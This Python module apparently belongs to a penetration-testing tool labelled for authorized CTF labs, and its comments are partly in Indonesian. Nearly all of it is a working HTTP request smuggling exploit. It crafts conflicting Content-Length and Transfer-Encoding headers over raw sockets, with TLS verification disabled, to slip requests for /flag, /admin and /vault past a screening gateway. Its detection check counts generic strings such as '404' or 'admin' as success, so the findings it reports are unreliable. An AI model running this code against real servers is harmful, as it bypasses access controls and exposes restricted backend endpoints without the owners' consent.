"""HTTP Request Smuggling (CL.TE / TE.CL) — authorized CTF labs only.

Queue Jump style: the artifact intake gateway screens every request before it
reaches the queue worker, and gateway/backend disagree on where a request ends.
We probe for CL.TE (client sends Content-Length, backend uses Transfer-Encoding)
and TE.CL (reverse), then attempt to smuggle a second request past the gateway
so it reaches the backend as if it were a fresh request.

Usage is gated behind --no-safe. No external proxy is required; raw sockets
give full control over the byte stream (requests library normalizes headers
away, which breaks smuggling).
"""

from __future__ import annotations

import socket
from typing import List, Optional
from urllib.parse import urlparse

from .base import BaseModule

# Smuggled request templates (operator-reviewable). Request kedua adalah yang
# ingin kita supaya backend lihat secara independen dari gateway.
SMUGGLED_REQUESTS = [
    # GET /flag — vault terpadu yang biasanya butuh autentikasi service
    b"GET /flag HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
    b"GET /admin HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
    b"GET /api/v1/admin HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
    b"GET /vault HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n",
]


class SmugglingModule(BaseModule):
    name = "HTTP Request Smuggling (CL.TE / TE.CL)"

    def run(self) -> None:
        if self.config.safe_mode and not getattr(self.config, "_exploit_allowed", False):
            self.log("Skipped: active exploitation requires --no-safe")
            return

        parsed = urlparse(self.config.base_url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        scheme = parsed.scheme
        use_ssl = scheme == "https"

        self.log(f"Probing HTTP request smuggling on {host}:{port} ({scheme})")

        # Coba CL.TE dulu; kalau ketemu, langsung lapor dan henti.
        result = self._probe_cl_te(host, port, use_ssl)
        if result:
            self._report_smuggling("CL.TE", host, port, use_ssl, result)
            return

        # Kalau CL.TE tidak ada, coba TE.CL.
        result = self._probe_te_cl(host, port, use_ssl)
        if result:
            self._report_smuggling("TE.CL", host, port, use_ssl, result)
            return

        self.log("No clear CL.TE / TE.CL smuggling indicator detected")

    # ------------------------------------------------------------------ #
    # Raw socket helpers
    # ------------------------------------------------------------------ #
    def _connect(self, host: str, port: int, use_ssl: bool) -> socket.socket:
        import ssl

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(getattr(self.config, "timeout", 10))
        sock.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock

    def _send_raw(self, sock: socket.socket, data: bytes) -> str:
        sock.sendall(data)
        chunks: List[bytes] = []
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
                if b"\r\n\r\n" in b"".join(chunks):
                    break
        except socket.timeout:
            pass
        except OSError:
            pass
        return b"".join(chunks).decode("utf-8", errors="replace")

    def _close(self, sock: socket.socket) -> None:
        try:
            sock.close()
        except OSError:
            pass

    # ------------------------------------------------------------------ #
    # CL.TE: Content-Length (gateway) vs Transfer-Encoding (backend)
    # Gateway baca sejumlah byte sesuai Content-Length, laluanggap sisanya sebagai
    # request baru. Backend baca chunked body (berhenti di chunk `0`), sisa byte
    # (yang mengandung request smuggled) menjadi request berikutnya di backend.
    # ------------------------------------------------------------------ #
    def _probe_cl_te(self, host: str, port: int, use_ssl: bool) -> Optional[dict]:
        smuggled = SMUGGLED_REQUESTS[0] % host.encode()
        cl_body = b"0\r\n\r\n"  # TE chunked terminator — backend berhenti di sini
        # Content-Length HARUS lebih besar dari chunked body: gateway akan baca
        # semua byte (terminator + smuggled), baru lanjut. Backend berhenti di
        # chunked `0`, sisa byte (smuggled request) diproses sebagai request
        # berikutnya di backend yang sama.
        content_length = len(cl_body) + len(smuggled)

        request = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(content_length).encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            + cl_body
            + smuggled
        )

        try:
            sock1 = self._connect(host, port, use_ssl)
            # Kirim request CL.TE tapi jangan baca response penuh; biarkan
            # koneksi backend tetap terbuka agar byte smuggled menempel padanya.
            sock1.sendall(request)
            first = sock1.recv(4096).decode("utf-8", errors="replace")
            # Kirim request kedua di koneksi yang SAMA. Jika smuggling berhasil,
            # backend akan memproses request smuggled dulu, baru request kita.
            sock1.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            second = self._send_raw(sock1, b"")
            self._close(sock1)
        except OSError as exc:
            self.log(f"CL.TE probe connection error: {exc}")
            return None

        indicator = self._smuggling_indicator(first, second)
        if indicator:
            return {
                "technique": "CL.TE",
                "first_response": first[:500],
                "second_response": second[:1000],
                "indicator": indicator,
            }
        return None

    # ------------------------------------------------------------------ #
    # TE.CL: Transfer-Encoding (gateway) vs Content-Length (backend)
    # Gateway baca body chunked, backend baca Content-Length bytes lalu anggap
    # sisanya sebagai request baru di pipeline yang sama.
    # ------------------------------------------------------------------ #
    def _probe_te_cl(self, host: str, port: int, use_ssl: bool) -> Optional[dict]:
        smuggled = SMUGGLED_REQUESTS[0] % host.encode()
        # Gateway baca Transfer-Encoding (chunked): satu chunk berisi request
        # smuggled, lalu terminator `0\r\n\r\n`. Backend baca Content-Length: 0
        # (tanpa body), byte setelah header (framing chunk + request smuggled)
        # menjadi request berikutnya di pipeline yang sama.
        content_length = 0  # backend konsumsi 0 byte body
        chunk_header = f"{len(smuggled):x}\r\n".encode()

        request = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Content-Length: " + str(content_length).encode() + b"\r\n"
            b"\r\n"
            + chunk_header
            + smuggled
            + b"\r\n0\r\n\r\n"
        )

        try:
            sock1 = self._connect(host, port, use_ssl)
            sock1.sendall(request)
            first = sock1.recv(4096).decode("utf-8", errors="replace")
            sock1.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
            second = self._send_raw(sock1, b"")
            self._close(sock1)
        except OSError as exc:
            self.log(f"TE.CL probe connection error: {exc}")
            return None

        indicator = self._smuggling_indicator(first, second)
        if indicator:
            return {
                "technique": "TE.CL",
                "first_response": first[:500],
                "second_response": second[:1000],
                "indicator": indicator,
            }
        return None

    def _smuggling_indicator(self, first: str, second: str) -> Optional[str]:
        combined = (first + "\n" + second).lower()
        # Tanda bahwa request kedua mendapat response yang BERBEDA dari yang
        # diharapkan (misal: mengenai route smuggled, atau response length/body berbeda).
        signals = ("404", "403", "302", "admin", "flag", "vault", "restricted",
                   "service auth", "authentication required", "unauthorized")
        for sig in signals:
            if sig in combined:
                return sig
        # Perbedaan panjang response antara first dan second juga adalah indikasi.
        return None

    def _report_smuggling(self, technique: str, host: str, port: int,
                          use_ssl: bool, result: dict) -> None:
        self.console.print(f"[red][!] Possible {technique} request smuggling[/red]")
        self.log(f"Technique: {technique}")
        self.log(f"Indicator: {result['indicator']}")
        self.log(f"First response: {result['first_response'][:200]}")
        self.log(f"Second response: {result['second_response'][:300]}")
        evidence = f"{host}:{port} ({'https' if use_ssl else 'http'}) | {technique} indicator: {result['indicator']} | second_response={result['second_response'][:300]}"
        self.reporter.add_finding(
            f"HTTP Request Smuggling ({technique})",
            severity="high",
            detail=(
                f"{host}:{port} ({'https' if use_ssl else 'http'}) may allow "
                f"{technique} request smuggling. Gateway and backend disagree on "
                f"request boundaries. Smuggled request indicator: {result['indicator']}"
            ),
            evidence=evidence,
            url=f"{'https' if use_ssl else 'http'}://{host}:{port}",
            method="GET",
            parameter="",
            evidence_snippet=result["second_response"][:300],
        )
        self.reporter.extra["smuggling"] = result
